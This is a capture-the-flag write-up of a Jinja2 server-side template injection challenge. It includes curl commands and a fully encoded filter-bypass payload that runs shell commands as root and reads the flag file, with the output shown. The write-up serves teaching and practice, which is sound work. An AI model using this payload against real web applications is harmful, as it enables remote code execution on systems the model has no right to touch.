# The Hot Cold War

## Description

The Bank of Spain launched a new website which might holds some really secretive insights of the bank blueprint. Find a way in to find a way out.

**Target URL** : [http://3.23.94.118:9000](http://3.23.94.118:9000/)

## Solution

Browsing to the given URL we see a subscribe form.

![](assets/subscribe.png)

The email value gets reflected in the response. 

![](assets/email.png)

This is safe against XSS vulnerability as its doing HTML encoding on the output. Looking at the response header we find that this application hosted using Python technology. 

```bash
curl http://3.23.94.118:9000/ -I
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.9.7
Date: Wed, 13 Apr 2022 12:20:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2905
```

 We can try to test for Server Side Template Injection which is very common in Python applications. The below image can help in detecting the SSTI vulnerability. 

> Note: Image reference is taken from [PostSwigger](https://portswigger.net/web-security/server-side-template-injection) blog.

![](assets/ssti.png)

Trying `{{7*7}}` results in `49`.

```bash
curl -s "http://3.23.94.118:9000/subscribe?email=\{\{7*7\}\}" | grep '<p '
      </div><br/><center><p class="section-header">49 will now enabled to receive monthly newsletters and updates.</p>
```

Referring to [SwisskyRepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread) SSTI payloads we can try below to execute the commands and read output.

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

```bash
curl -s "http://3.23.94.118:9000/subscribe?email=%7B%7B%20self._TemplateReference__context.cycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%20%7D%7D" | grep '<p '
      </div><br/><center><p class="section-header">ah! we don&#39;t allow these characters</p>
```

It is blocking some characters. After some testing we can list the following blacklisted characters. 

```
__
classes
file
write
format
\x
application
builtins
request[request.
TemplateReference
context etc
```

We can try to form a payload by referring to [0day.work](https://0day.work/jinja2-template-injection-filter-bypasses/) blogpost. But that doesn't seem to work since this application is built using Python3 and `file` primitive doesn't exist. We have to find a work around. Taking the parameter splitting technique from the blogpost we can try to split the below working payload to bypass the blocklist.

```python
request.__class__.__mro__.last().__subclasses__().filtermap('__init__').filtermap('__globals__').filter('popen').first()
```

The below payload will work with Python3 bypassing the blocklists. 

```
{'us': '_', 'class': 'class', 'mro': 'mro', 'subclasses': 'subclasses', 'init': 'init', 'globals': 'globals', 'popen': 'popen', 'email': "{% set os = request|attr([request.args.us, request.args.us, request.args.class, request.args.us, request.args.us]|join)|attr([request.args.us, request.args.us, request.args.mro, request.args.us, request.args.us]|join)|last|attr([request.args.us, request.args.us, request.args.subclasses, request.args.us, request.args.us]|join)()|selectattr([request.args.us, request.args.us, request.args.init, request.args.us, request.args.us]|join)|map(attribute=[request.args.us, request.args.us, request.args.init, request.args.us, request.args.us]|join)|selectattr([request.args.us, request.args.us, request.args.globals, request.args.us, request.args.us]|join)|map(attribute=[request.args.us, request.args.us, request.args.globals, request.args.us, request.args.us]|join)|selectattr(request.args.popen)|first%}{{os.popen('id').read()}}"}
```

Let's encode the payload and send the request

```bash
curl -s 'http://3.23.94.118:9000/subscribe?us=_&class=class&mro=mro&subclasses=subclasses&init=init&globals=globals&popen=popen&email=%7B%25+set+os+%3D+request%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.class%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.mro%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Clast%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.subclasses%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%28%29%7Cselectattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.init%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cmap%28attribute%3D%5Brequest.args.us%2C+request.args.us%2C+request.args.init%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cselectattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.globals%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cmap%28attribute%3D%5Brequest.args.us%2C+request.args.us%2C+request.args.globals%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cselectattr%28request.args.popen%29%7Cfirst%25%7D%7B%7Bos.popen%28%27id%27%29.read%28%29%7D%7D' | grep '<p '
      </div><br/><center><p class="section-header">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Flag can be read from `/flag.txt`. 

```bash
curl -s 'http://3.23.94.118:9000/subscribe?us=_&class=class&mro=mro&subclasses=subclasses&init=init&globals=globals&popen=popen&email=%7B%25+set+os+%3D+request%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.class%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.mro%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Clast%7Cattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.subclasses%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%28%29%7Cselectattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.init%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cmap%28attribute%3D%5Brequest.args.us%2C+request.args.us%2C+request.args.init%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cselectattr%28%5Brequest.args.us%2C+request.args.us%2C+request.args.globals%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cmap%28attribute%3D%5Brequest.args.us%2C+request.args.us%2C+request.args.globals%2C+request.args.us%2C+request.args.us%5D%7Cjoin%29%7Cselectattr%28request.args.popen%29%7Cfirst%25%7D%7B%7Bos.popen%28%27cat%20%2fflag.txt%27%29.read%28%29%7D%7D' | grep '<p '
      </div><br/><center><p class="section-header">ACVCTF{t3mpl4t3s_4r3_s0_c0mpl3x_th4n_u_1m4g1n3}
```

